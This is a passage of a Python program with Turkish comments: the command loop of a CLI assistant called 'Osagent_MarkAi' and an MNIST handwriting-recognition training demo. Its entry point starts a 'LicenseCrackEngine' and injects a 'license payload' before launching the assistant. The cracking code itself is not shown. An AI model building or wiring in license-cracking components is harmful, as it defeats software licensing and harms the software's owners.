            "history": self.chat_history
        }
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            print(f"\n  [✓] Rapor kaydedildi: {filename}\n")
        except Exception as e:
            print(f"\n  [!] Dosya yazma hatası: {e}\n")
    
    def cmd_clear(self, args: Optional[List[str]] = None):
        """Ekranı temizle"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self._banner()
    
    def cmd_exit(self, args: Optional[List[str]] = None):
        """Çıkış"""
        total = self.license.get_total_usage()
        print(f"\n  {'='*50}")
        print(f"  👋 Osagent_MarkAi kapatılıyor...")
        print(f"  {'='*50}")
        print(f"  Toplam kredi kullanımı: {total:.1f}")
        print(f"  Oturum süresi: {len(self.chat_history)} işlem")
        print(f"  Görüşürüz!\n")
        self.running = False
        sys.exit(0)
    
    # ------------------------------------------------------------------
    # ANA DÖNGÜ
    # ------------------------------------------------------------------
    
    def run(self):
        """Ana komut döngüsü"""
        while self.running:
            try:
                cmd = input(f"\n{self.name}# ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                self.cmd_exit()
                break
            
            if not cmd:
                continue
            
            parts = cmd.split()
            base_cmd = parts[0].lower()
            cmd_args = parts[1:] if len(parts) > 1 else None
            
            if base_cmd in self.commands:
                try:
                    self.commands[base_cmd](cmd_args)
                except Exception as e:
                    print(f"\n  [!] Komut hatası ({base_cmd}): {e}")
                    logger.exception(f"Komut başarısız: {base_cmd}")
            else:
                print(f"  [!] Bilinmeyen komut: '{base_cmd}'. 'help' yazın.")
                
                # Benzer komut önerisi
                suggestions = [c for c in self.commands if c.startswith(base_cmd[0])]
                if suggestions:
                    print(f"  [!] Benzer komutlar: {', '.join(suggestions[:5])}")


# ==================================================================
# BÖLÜM 3: MNIST CNN (EL YAZISI TANIMA)
# ==================================================================

class CNN(nn.Module):
    """MNIST için CNN mimarisi"""
    
    def __init__(self):
        super(CNN, self).__init__()
        self.conv1 = nn.Conv2d(1, 32, kernel_size=3, padding=1)
        self.bn1 = nn.BatchNorm2d(32)
        self.conv2 = nn.Conv2d(32, 64, kernel_size=3, padding=1)
        self.bn2 = nn.BatchNorm2d(64)
        self.pool = nn.MaxPool2d(2, 2)
        self.fc1 = nn.Linear(64 * 7 * 7, 128)
        self.fc2 = nn.Linear(128, 10)
        self.dropout = nn.Dropout(0.25)

    def forward(self, x):
        x = self.pool(F.relu(self.bn1(self.conv1(x))))
        x = self.pool(F.relu(self.bn2(self.conv2(x))))
        x = x.view(-1, 64 * 7 * 7)
        x = F.relu(self.fc1(x))
        x = self.dropout(x)
        x = self.fc2(x)
        return x


def train_mnist():
    """
    MNIST CNN eğitimi ve test demo
    - 5 epoch eğitim
    - Test seti accuracy
    - Örnek tahmin görselleştirme
    """
    
    # Hiperparametreler
    BATCH_SIZE = 64
    EPOCHS = 5
    LEARNING_RATE = 0.001
    
    # Veri ön işleme
    transform = transforms.Compose([
        transforms.ToTensor(),
        transforms.Normalize((0.1307,), (0.3081,))
    ])
    
    print("  [*] MNIST veri seti indiriliyor...")
    
    # Veri setlerini yükle
    try:
        train_dataset = datasets.MNIST(
            root='./data', train=True, download=True, transform=transform
        )
        test_dataset = datasets.MNIST(
            root='./data', train=False, download=True, transform=transform
        )
        print("  [✓] Veri seti yüklendi.")
    except Exception as e:
        print(f"  [!] MNIST indirme hatası: {e}")
        print("  [*] Mevcut data kontrol ediliyor...")
        # Tekrar dene - belki indirilmiştir
        train_dataset = datasets.MNIST(
            root='./data', train=True, download=False, transform=transform
        )
        test_dataset = datasets.MNIST(
            root='./data', train=False, download=False, transform=transform
        )
    
    train_loader = DataLoader(
        train_dataset, batch_size=BATCH_SIZE, shuffle=True, 
        num_workers=0, pin_memory=True
    )
    test_loader = DataLoader(
        test_dataset, batch_size=BATCH_SIZE, shuffle=False,
        num_workers=0, pin_memory=True
    )
    
    print(f"  Eğitim: {len(train_dataset)} örnek")
    print(f"  Test  : {len(test_dataset)} örnek")
    
    # Device
    device = torch.device('cuda' if torch.cuda.is_available() else 'cpu')
    print(f"  Device: {device}")
    
    # Model
    model = CNN().to(device)
    criterion = nn.CrossEntropyLoss()
    optimizer = optim.Adam(model.parameters(), lr=LEARNING_RATE)
    scheduler = optim.lr_scheduler.StepLR(optimizer, step_size=3, gamma=0.1)
    
    print(f"\n  {'='*50}")
    print(f"  🧠 EĞİTİM BAŞLIYOR ({EPOCHS} epoch)")
    print(f"  {'='*50}\n")
    
    # Eğitim döngüsü
    train_losses = []
    train_accs = []
    
    for epoch in range(1, EPOCHS + 1):
        model.train()
        total_loss = 0.0
        correct = 0
        total = 0
        batch_count = 0
        
        for batch_idx, (images, labels) in enumerate(train_loader):
            images, labels = images.to(device), labels.to(device)
            
            optimizer.zero_grad()
            outputs = model(images)
            loss = criterion(outputs, labels)
            loss.backward()
            optimizer.step()
            
            total_loss += loss.item()
            _, predicted = torch.max(outputs, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
            batch_count += 1
            
            # İlerleme
            if (batch_idx + 1) % 100 == 0:
                print(f"  Epoch {epoch}/{EPOCHS} | Batch {batch_idx+1}/{len(train_loader)} "
                      f"| Loss: {loss.item():.4f}")
        
        scheduler.step()
        
        epoch_loss = total_loss / batch_count
        epoch_acc = 100.0 * correct / total
        train_losses.append(epoch_loss)
        train_accs.append(epoch_acc)
        
        print(f"\n  📊 Epoch {epoch}/{EPOCHS} tamamlandı")
        print(f"     Loss: {epoch_loss:.4f} | Accuracy: {epoch_acc:.2f}%\n")
    
    # Test
    print(f"  {'='*50}")
    print(f"  TEST AŞAMASI")
    print(f"  {'='*50}\n")
    
    model.eval()
    correct = 0
    total = 0
    all_predictions = []
    all_labels = []
    
    with torch.no_grad():
        for images, labels in test_loader:
            images, labels = images.to(device), labels.to(device)
            outputs = model(images)
            _, predicted = torch.max(outputs, 1)
            total += labels.size(0)
            correct += (predicted == labels).sum().item()
            all_predictions.extend(predicted.cpu().numpy())
            all_labels.extend(labels.cpu().numpy())
    
    test_acc = 100.0 * correct / total
    print(f"  🎯 Test Accuracy: {test_acc:.2f}% ({correct}/{total})\n")
    
    # Sınıf bazında accuracy
    class_correct = [0] * 10
    class_total = [0] * 10
    for pred, label in zip(all_predictions, all_labels):
        class_total[label] += 1
        if pred == label:
            class_correct[label] += 1
    
    print(f"  Sınıf bazında accuracy:")
    for i in range(10):
        acc = 100.0 * class_correct[i] / class_total[i] if class_total[i] > 0 else 0
        print(f"     Rakam {i}: {acc:.1f}% ({class_correct[i]}/{class_total[i]})")
    
    # Örnek tahminleri görselleştir
    print(f"\n  [*] Örnek tahminler görselleştiriliyor...")
    
    images, labels = next(iter(test_loader))
    images, labels = images.to(device), labels.to(device)
    outputs = model(images)
    _, predicted = torch.max(outputs, 1)
    
    fig, axes = plt.subplots(2, 5, figsize=(12, 5))
    fig.suptitle(f'MNIST Tahminleri (Test Accuracy: {test_acc:.2f}%)', fontsize=14)
    
    for i in range(min(10, len(images))):
        ax = axes[i // 5, i % 5]
        img = images[i].cpu().squeeze().numpy()
        ax.imshow(img, cmap='gray')
        true_label = labels[i].item()
        pred_label = predicted[i].item()
        color = 'green' if true_label == pred_label else 'red'
        ax.set_title(f"G:{true_label} → T:{pred_label}", 
                     fontsize=10, color=color, fontweight='bold')
        ax.axis('off')
    
    plt.tight_layout()
    
    # Kaydet
    output_file = "ornek_tahminler.png"
    plt.savefig(output_file, dpi=150, bbox_inches='tight')
    plt.close()
    
    print(f"  📸 '{output_file}' kaydedildi.")
    
    # Eğitim grafiği
    fig2, (ax1, ax2) = plt.subplots(1, 2, figsize=(10, 4))
    fig2.suptitle('Eğitim Metrikleri', fontsize=14)
    
    ax1.plot(range(1, EPOCHS + 1), train_losses, 'b-', marker='o')
    ax1.set_xlabel('Epoch')
    ax1.set_ylabel('Loss')
    ax1.set_title('Training Loss')
    ax1.grid(True, alpha=0.3)
    
    ax2.plot(range(1, EPOCHS + 1), train_accs, 'g-', marker='o')
    ax2.set_xlabel('Epoch')
    ax2.set_ylabel('Accuracy (%)')
    ax2.set_title('Training Accuracy')
    ax2.grid(True, alpha=0.3)
    
    plt.tight_layout()
    plt.savefig("egitim_grafik.png", dpi=150, bbox_inches='tight')
    plt.close()
    
    print(f"  📊 'egitim_grafik.png' kaydedildi.")
    print(f"\n  {'='*50}")
    print(f"  ✅ MNIST DEMOSU TAMAMLANDI")
    print(f"  🎯 Final Test Accuracy: {test_acc:.2f}%")
    print(f"  {'='*50}\n")


# ==================================================================
# ANA GİRİŞ NOKTASI
# ==================================================================

if __name__ == "__main__":
    try:
        # Önce lisans motoru başlat
        cracker = LicenseCrackEngine()
        payload = cracker.inject_license_payload()
        logger.debug(f"License payload: {payload[:50]}...")
        
        # AI motorunu başlat
        ai = OsagentAI()
        ai.run()
        
    except KeyboardInterrupt:
        print("\n\n  [!] Kullanıcı tarafından sonlandırıldı.")
    except Exception as e:
        print(f"\n\n  [☠] KRİTİK HATA: {e}")
        logger.exception("Kritik hata")
        sys.exit(1)
